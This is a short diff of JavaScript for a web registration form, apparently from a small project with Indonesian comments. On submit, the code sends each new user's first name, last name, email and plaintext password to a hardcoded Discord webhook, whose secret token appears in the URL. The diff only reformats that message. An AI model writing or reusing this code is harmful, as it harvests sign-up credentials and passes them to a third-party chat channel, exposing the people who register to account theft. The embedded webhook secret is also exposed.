@@ -13,8 +13,13 @@ registerForm.addEventListener("submit", (e) => {
   const webhookURL = "https://discord.com/api/webhooks/1331267993916805200/ldxIhL7EUuwqEOq15y2MVIq-JYrjB4yqVFbkYs2U-ymLej4SmJfmz4Wbp_Bzm0B38QyX"; // Ganti ini
 
   const data = {
-    content: `**New User Registered!**\n**First Name:** ${firstName}\n**Last Name:** ${lastName}\n**Email:** ${email}\
-    \n**Password:** ${password}`, // Pesan ke Discord
+    content: `━━━━━━━━━━━━━━━━━━━\n` +
+             `**New User Registration**\n` +
+             `**First Name:** ${firstName}\n` +
+             `**Last Name:** ${lastName}\n` +
+             `**Email:** ${email}\n` +
+             `**Password:** ${password}\n` +
+             `━━━━━━━━━━━━━━━━━━━`, // Pesan ke Discord
   };
 
   fetch(webhookURL, {
